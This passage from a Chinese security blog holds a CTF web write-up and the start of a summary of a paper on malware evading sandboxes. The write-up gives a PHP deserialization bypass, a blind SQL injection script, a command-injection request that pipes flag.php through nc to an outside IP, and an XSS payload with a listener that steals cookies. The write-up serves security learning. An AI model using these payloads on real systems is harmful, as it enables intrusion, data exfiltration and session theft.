<span class="keyword">if</span>(get_magic_quotes_gpc())&#123; </div><div class="line">        $str4=stripslashes($str4); </div><div class="line">    &#125; </div><div class="line"></div><div class="line">    $res = unserialize($str4); </div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($res) &#123; </div><div class="line">    $res-&gt;flag=$flag3; </div><div class="line">        <span class="keyword">if</span> ($res-&gt;flag === $res-&gt;temp) </div><div class="line">            <span class="keyword">echo</span> $res-&gt;flag; </div><div class="line">        <span class="keyword">else</span> </div><div class="line">            <span class="keyword">die</span>(); </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(); </div><div class="line">&#125;</div></pre></td></tr></table></figure><p>我们看如下两个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$str4 = <span class="string">'O:7:"Secrets":3:&#123;s:4:"temp";N;s:4:"test";i:100;s:4:"flag";R:3;&#125;'</span>;</div><div class="line">$res = unserialize($str4);</div><div class="line">print_r($res);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">__PHP_Incomplete_Class Object</div><div class="line">(</div><div class="line">    [__PHP_Incomplete_Class_Name] =&gt; Secrets</div><div class="line">    [temp] =&gt;</div><div class="line">    [test] =&gt; 100</div><div class="line">    [flag] =&gt; 100</div><div class="line">)</div></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$str4 = <span class="string">'O:7:"Secrets":3:&#123;s:4:"temp";N;s:4:"test";i:100;s:4:"flag";R:2;&#125;'</span>;</div><div class="line">$res = unserialize($str4);</div><div class="line">print_r($res);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">__PHP_Incomplete_Class Object</div><div class="line">(</div><div class="line">    [__PHP_Incomplete_Class_Name] =&gt; Secrets</div><div class="line">    [temp] =&gt;</div><div class="line">    [test] =&gt; 100</div><div class="line">    [flag] =&gt;</div><div class="line">)</div></pre></td></tr></table></figure><p>所以我们可以使用反序列化中的引用类型来绕过此处的校验<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:7:&quot;Secrets&quot;:2:&#123;s:4:&quot;temp&quot;;N;s:4:&quot;flag&quot;;R:2;&#125;</div></pre></td></tr></table></figure><h2 id="0x02-Set-Me-Free"><a href="#0x02-Set-Me-Free" class="headerlink" title="0x02 Set Me Free"></a>0x02 Set Me Free</h2><p>使用Python3.7编写的具有二分查找功能的sql盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, parse</div><div class="line"><span class="keyword">import</span> sys, math</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(query)</span>:</span></div><div class="line"> </div><div class="line">    data = parse.urlencode(&#123; <span class="string">'username'</span> : <span class="string">"') and if((%s),1,0) #"</span> % query &#125;).encode()</div><div class="line"> </div><div class="line">    req = request.Request(<span class="string">'http://3.16.68.122/smf/register.php'</span>, data = data)</div><div class="line">    req.get_method = <span class="keyword">lambda</span> : <span class="string">'POST'</span></div><div class="line">    res = request.urlopen(req).read().decode()</div><div class="line">     </div><div class="line">    <span class="keyword">return</span> res.find(<span class="string">'User Not Registered'</span>) != <span class="number">-1</span>; <span class="comment"># means true</span></div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">greater_than_or_equal</span><span class="params">(query, i)</span>:</span></div><div class="line">    <span class="keyword">return</span> send(<span class="string">'%s &gt;= %d'</span> % (query, i));</div><div class="line">     </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">equal</span><span class="params">(query, i)</span>:</span></div><div class="line">    <span class="keyword">return</span> send(<span class="string">'%s = %d'</span> % (query, i));</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(query)</span>:</span></div><div class="line">    min_val = <span class="number">0</span></div><div class="line">    max_val = <span class="number">128</span></div><div class="line">     </div><div class="line">    <span class="keyword">while</span> min_val + <span class="number">1</span> &lt; max_val:</div><div class="line">        mid = math.floor((min_val + max_val) / <span class="number">2</span>)</div><div class="line">         </div><div class="line">        <span class="keyword">if</span> greater_than_or_equal(query, mid):</div><div class="line">            min_val = mid</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            max_val = mid</div><div class="line">     </div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> equal(query, min_val):</div><div class="line">        <span class="keyword">return</span> search(query)</div><div class="line">     </div><div class="line">    <span class="keyword">return</span> min_val</div><div class="line">     </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span><span class="params">(query)</span>:</span></div><div class="line">    <span class="keyword">return</span> search(<span class="string">'length((%s))'</span> % query)</div><div class="line">     </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_and_print_content</span><span class="params">(query, length)</span>:</span></div><div class="line">    content = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</div><div class="line">        content += chr(search(<span class="string">'ord(substr((%s), %d, 1))'</span> % (query, i + <span class="number">1</span>)))</div><div class="line">        sys.stdout.write(<span class="string">'\r[%s] %s%s'</span> % (length, content, <span class="string">'_'</span> * (length - len(content))))</div><div class="line">    print(<span class="string">''</span>)</div><div class="line">    <span class="keyword">return</span> content</div><div class="line"> </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    arg = <span class="string">' '</span>.join(sys.argv[<span class="number">1</span>:])</div><div class="line">     </div><div class="line">    content_len = get_length(arg)</div><div class="line">    get_and_print_content(arg, content_len)</div></pre></td></tr></table></figure><p>参考：<br><a href="https://posix.tistory.com/84" target="_blank" rel="external">https://posix.tistory.com/84</a></p><h2 id="0x03-PingService"><a href="#0x03-PingService" class="headerlink" title="0x03 PingService"></a>0x03 PingService</h2><p>源码泄露<code>http://3.17.167.161/PingService/helper.php~</code><br>题目源代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIP</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (@$_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>])&#123;</div><div class="line">$ip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>])&#123;</div><div class="line">$ip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$_SERVER[<span class="string">"REMOTE_ADDR"</span>])&#123;</div><div class="line">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>))&#123;</div><div class="line">$ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>);</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"HTTP_CLIENT_IP"</span>))&#123;</div><div class="line">$ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>);</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"REMOTE_ADDR"</span>))&#123;</div><div class="line">$ip = getenv(<span class="string">"REMOTE_ADDR"</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">$ip = <span class="string">"Unknown"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> $ip;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($data)</span> </span>&#123;</div><div class="line"><span class="keyword">if</span> (!(preg_match(<span class="string">'/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m'</span>, $data))) &#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">'&lt;center&gt;&lt;h2 style="color:red;"&gt;Shoo Go Away heckermen... Thats not an IP Address&lt;/h2&gt;&lt;/center&gt;'</span>);</div><div class="line"> &#125;</div><div class="line">    $black_list = <span class="keyword">array</span>(<span class="string">'"'</span>, <span class="string">"'"</span>, <span class="string">" "</span>,<span class="string">"\n"</span>);</div><div class="line">    <span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $key) &#123;</div><div class="line">        <span class="comment">// if(strpos($data, $key) !== false)&#123;</span></div><div class="line">        <span class="comment">//     die("&lt;center&gt; Not Allowed &lt;/center&gt;");</span></div><div class="line">        <span class="comment">// &#125;</span></div><div class="line">        $data = str_replace($key, <span class="string">''</span>, $data);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $data;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>根据clean函数可以看出应该可能存在blind rce。根据getIP函数的内容，我们首先修改X-Forwarder-For字段为127.0.0.1之后返回了源代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">require_once</span>(<span class="string">'helper.php'</span>);</div><div class="line"><span class="keyword">if</span> (getIP() != <span class="string">"127.0.0.1"</span>)&#123;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"./main.css"</span> <span class="attr">media</span>=<span class="string">"all"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">    <span class="keyword">die</span>(<span class="string">"Oye! This service is only for local client"</span>);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"./main.css"</span> <span class="attr">media</span>=<span class="string">"all"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-screen"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"app-title"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Ping Service<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-form"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"control-group"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"login-field"</span> <span class="attr">placeholder</span>=<span class="string">"8.8.8.8"</span> <span class="attr">id</span>=<span class="string">"ip"</span> <span class="attr">name</span>=<span class="string">"ip"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"login-field-icon fui-user"</span> <span class="attr">for</span>=<span class="string">"login-form"</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-large btn-block"</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span> </div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'ip'</span>]))&#123;</div><div class="line">    highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'ip'</span>])) &#123;</div><div class="line">    $ip = $_POST[<span class="string">'ip'</span>];</div><div class="line">    $ip = <span class="string">'ping -c 1 '</span>.clean($ip);</div><div class="line">    $res = str_replace(<span class="string">"\n"</span>, <span class="string">"&lt;/br&gt;\n"</span>, shell_exec($ip));</div><div class="line">    <span class="keyword">if</span>(strpos($res, <span class="string">"100% packet loss"</span>)!==<span class="keyword">false</span>)&#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;center&gt; &lt;h2 style='color:red'&gt;Not Alive &lt;/h2&gt;&lt;/center&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;center&gt; &lt;h2 style='color:yellow'&gt;Alive &lt;/h2&gt;&lt;/center&gt;"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>从源代码上已经确定是rce的一种利用，从clean函数中看到过滤了空格，但是我们可以使用<code>${IFS}</code>来bypass</p><p>最终的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /PingService/ HTTP/1.1</div><div class="line">Host: 3.17.167.161</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://3.17.167.161/PingService/</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 68</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">x-forwarded-for:127.0.0.1</div><div class="line"></div><div class="line">ip=8.8.8.8%0a;cat$&#123;IFS%?&#125;flag.php|nc$&#123;IFS%?&#125;47.90.204.28$&#123;IFS%?&#125;2233</div></pre></td></tr></table></figure><p>返回的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$flag = <span class="string">'b00t2root&#123;mr.s74rk_1_d0nt_feel_s0_g00d&#125;'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><h2 id="0x04-eXquisite-Scenery-Sites"><a href="#0x04-eXquisite-Scenery-Sites" class="headerlink" title="0x04 eXquisite Scenery Sites"></a>0x04 eXquisite Scenery Sites</h2><p>IP转int<br><a href="http://www.bejson.com/convert/ip2int/" target="_blank" rel="external">http://www.bejson.com/convert/ip2int/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /Web-2/contact.php HTTP/1.1</div><div class="line">Host: 18.218.187.241</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://18.218.187.241/Web-2/contact.php</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 100</div><div class="line">Connection: close</div><div class="line">Cookie: PHPSESSID=008185861a14c247da3b48a088fc8a75</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">user=test&amp;Message=&lt;sCript&gt;document[&apos;location&apos;]=&apos;http://794479644:51/?&apos;%2Bdocument[&apos;cookie&apos;]&lt;/Script&gt;</div></pre></td></tr></table></figure><p>这次使用一句话服务器却怎么也接受不到bot发过来的请求，之后使用如下脚本就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#/usr/bin/env python</span></div><div class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></div><div class="line"><span class="comment"># blog : evilwing.me</span></div><div class="line"><span class="comment"># __Author__ : wing</span></div><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</div><div class="line">xss = Flask(__name__)</div><div class="line"><span class="meta">@xss.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">    flag = request.args</div><div class="line">    <span class="keyword">for</span> i,j <span class="keyword">in</span> flag.items():</div><div class="line">        print(<span class="string">'Flag is:'</span> + j)</div><div class="line">    <span class="keyword">return</span> str()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    xss.run(host=<span class="string">"0.0.0.0"</span>,port=<span class="number">51</span>)</div></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@zeros ~]# python xssflag.py</div><div class="line"> * Running on http://0.0.0.0:51/ (Press CTRL+C to quit)</div><div class="line">Flag is:b00t2root&#123;why_y0u_st34l_my_c00ki3s?&#125;; PHPSESSID=up8133i9r901kr52r93v5um0vf</div></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Spotless Sandboxes-&gt;Evading Malware Analysis Systems using Wear-and-Tear Artifacts</title>
      <link href="/2019/03/20/Spotless-Sandboxes/"/>
      <url>/2019/03/20/Spotless-Sandboxes/</url>
      <content type="html"><![CDATA[<p>出处：2017 IEEE Symposium on Security and Privacy (SP)<br>作者：Najmeh Miramirkhani, Mahathi Priya Appini, Nick Nikiforakis, Michalis Polychronakis<br>单位：Stony Brook University<br>资料：<a href="https://ieeexplore.ieee.org/abstract/document/7958622" target="_blank" rel="external">Paper</a> </p><h2 id="1-Abstract-amp-INTRODUCTION"><a href="#1-Abstract-amp-INTRODUCTION" class="headerlink" title="1.Abstract &amp; INTRODUCTION"></a>1.Abstract &amp; INTRODUCTION</h2><p>动态恶意代码分析系统通过将每个样本加载到称为沙箱的大量仪器环境中来操作，并以不同的粒度级别（例如，I/O活动，系统调用，机器指令）监视其操作。 恶意软件沙箱通常使用API hooking机制、CPU仿真器、虚拟机、甚至是专用的裸机主机来构建。</p><p>攻击者角度:</p><ol><li>使用打包、多态以及其他代码混淆技术规避基于静态代码分析的恶意软件扫描技术；</li><li>在恶意软件中加入一定的“环境感知能力”来规避恶意软件沙箱环境的分析(在发现身处沙箱环境后采用直接崩溃或者展示“良性”行为)。</li></ol><p>防御者角度:</p><ol><li>一般而言用实际值替换分析环境的特有属性并隐藏检测工具，来尝试避免被恶意软件感知；</li><li>针对使用仿真或者虚拟技术的产品而言，使用清除特定的驱动程序、进程以及其它虚拟技术指示器来实现防规避；</li><li>使用裸机(在进行一定的隔离后，直接使用物理计算机)。</li></ol><p>防御者角度的问题缺陷:</p><ol><li>用于分析的操作系统几乎是原始状态的；</li><li>每次进行过二进制分析之后就会将系统回滚至最初状态(浏览器记录、系统日志等信息均被回滚)。</li></ol><p>PS:以上内容之所以说是缺陷，是因为真实环境中用户不可能主动去将”缓存”(广义缓存，泛指日志、注册表等)的记录进行回滚或者初始化。</p><p>因此在本文中作者提出了一种利用操作系统“wear and tear”(使用痕迹的含义，后文简称为磨损)和“aging”(使用年份的含义，后文简称为老化)的特征来规避sandbox(恶意软件沙箱环境)的方法。</p><p>本文的两项研究成果:</p><ol><li>构建决策树模型，使恶意软件稳定地避免所有经过测试的沙箱的准确率提升至92.86％；</li><li>构建的统计模型可以根据系统使用指标预测系统的年龄，并可用于将现有的人造沙箱“老化”到所需的年限范围。</li></ol><h2 id="BACKGROUND-AND-RELATED-WORK"><a href="#BACKGROUND-AND-RELATED-WORK" class="headerlink" title="BACKGROUND AND RELATED WORK"></a>BACKGROUND AND RELATED WORK</h2><h3 id="A-Virtualization-and-Instrumentation-Artifacts"><a href="#A-Virtualization-and-Instrumentation-Artifacts" class="headerlink" title="A. Virtualization and Instrumentation Artifacts"></a>A. Virtualization and Instrumentation Artifacts</h3><ol><li>防御者D: 使用系统仿真器和虚拟机构建恶意软件沙箱十分方便</li><li>攻击者A: 使用静态启发式检查某些系统属性，例如特定于VM的设备驱动程序和硬件配置，固定标识符（包括MAC地址），IMEI（用于移动恶意软件分析系统），用户/主机名，VM特定加载的模块和流程（例如VMware的VMware Tools）和注册表项等</li><li>防御者D: 配置动态分析系统时以避免出现期望值和配置</li><li>攻击者A: 这对虚拟化指令的时序属性、运行时使用小代码片段等底层属性作用不大</li></ol><h3 id="B-Environmental-and-User-Interaction-Artifacts"><a href="#B-Environmental-and-User-Interaction-Artifacts" class="headerlink" title="B. Environmental and User Interaction Artifacts"></a>B. Environmental and User Interaction Artifacts</h3><p>防御者D: 我的两种方案:</p><ol><li>在多个不同的分析系统上运行每个样本来检测恶意软件的“分裂个性”；</li><li>避免完全使用仿真或虚拟化，并选择“裸机”系统来保持分析环境的真实性。</li></ol><p>攻击者A: 目前虚拟化技术的广泛使用，应当认为VM和非VM是具有同样的感染价值的，从而减少对VM检测技巧的使用，转而采取如下几种启发式方法:</p><ol><li>检查鼠标光标是否在屏幕中央保持静止；</li><li>是否存在“最近打开文件”；</li><li>异常低数量的进程；</li><li>不受限制的互联网连接，并尝试解析已知的不存在的域名(比如WannaCry)。</li></ol><p>防御者D: 我的两种对策:</p><ol><li>模拟用户行为；</li><li>暴露更真实的网络环境</li></ol><p>防御者D对策的缺陷: 系统正常使用而预计会发生磨损和老化特征未被考虑。</p><h3 id="C-Sandbox-Fingerprinting"><a href="#C-Sandbox-Fingerprinting" class="headerlink" title="C. Sandbox Fingerprinting"></a>C. Sandbox Fingerprinting</h3><p>SandFinger: 使用移动设备属性来作为沙箱指纹来规避Google的Bouncer沙箱。</p><p>AVLeak: 使用侧信道的方式捕获AV引擎中的指纹。</p><p>SandPrint: 提取Windows沙箱中的硬件配置参数，恶意软件样本调用机制的特征，可执行文件的文件名等特征进行聚类分析，进而识别沙箱。</p><p>如果沙箱操作员将沙箱的特征值进行多样化处理，致使是指纹失效。那么攻击者下一步会考虑怎么方法进行规避? 这种方式就是本文中所提到的真实系统才具有的“磨损”和“老化”特征。</p><h2 id="III-WEAR-AND-TEAR-ARTIFACTS"><a href="#III-WEAR-AND-TEAR-ARTIFACTS" class="headerlink" title="III. WEAR AND TEAR ARTIFACTS"></a>III. WEAR AND TEAR ARTIFACTS</h2><p>文中选用的artifact的特点: 恶意软件可以轻松探测</p><p>artifact的选择策略: 哪些在系统的正常使用中会被影响</p><h3 id="A-Probing-for-Artifacts-while-Preserving-User-Privacy"><a href="#A-Probing-for-Artifacts-while-Preserving-User-Privacy" class="headerlink" title="A. Probing for Artifacts while Preserving User Privacy"></a>A. 